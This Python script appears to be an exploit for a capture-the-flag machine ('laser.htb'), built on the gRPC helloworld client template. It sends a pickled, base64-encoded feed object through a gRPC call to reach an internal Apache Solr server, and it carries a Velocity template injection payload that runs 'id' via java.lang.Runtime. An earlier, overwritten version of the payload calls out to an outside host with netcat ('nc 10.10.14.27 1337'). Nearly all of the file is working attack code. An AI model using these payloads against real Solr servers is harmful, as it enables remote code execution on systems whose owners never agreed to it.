# Copyright 2015 gRPC authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""The Python implementation of the GRPC helloworld.Greeter client."""

from __future__ import print_function
import logging

import grpc
import base64
import s_pb2
import s_pb2_grpc
import json
import pickle

def make_data(port):
    url = ("/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
            "%23set($x=%27%27)+"
            "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
            "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
            "%23set($str=$x.class.forName(%27java.lang.String%27))+"
            "%23set($ex=$rt.getRuntime().exec(%27" + "nc%2010.10.14.27%201337" +
            "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
            "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
    inj = 'String[] commands = new String[]{"nc", "localhost", "8080"};Process childProc = Runtime.getRuntime().exec(command);InputStream in = childProc.getInputStream();int c;while ((c = in.read()) != -1) {System.out.print((char)c);}in.close();'

    url = "/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:' + port + url + '","feed_url": "http://localhost:' + port +'/feeds.json"}'
    # For storing 
    p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
    p = base64.b64encode(p)
    return p 

'''
p = pickle.loads(b) 
print(p) 
assert(0)

#serialize
payload = json.dumps(p).encode()
payload = base64.b64encode(payload)
'''


def run(t):
    # NOTE(gRPC Python Team): .close() is possible on a channel and should be
    # used in circumstances in which the with statement does not fit the needs
    # of the code.
    with grpc.insecure_channel('laser.htb:9000') as channel:
        stub = s_pb2_grpc.PrintStub(channel)

        d = s_pb2.Content(
                data = t,
                )

        response = stub.Feed(d)

    print(response)
    print("Greeter client received: " + response.feed)


if __name__ == '__main__':
    port = "8983"
    temp = make_data(port)
    run(temp)
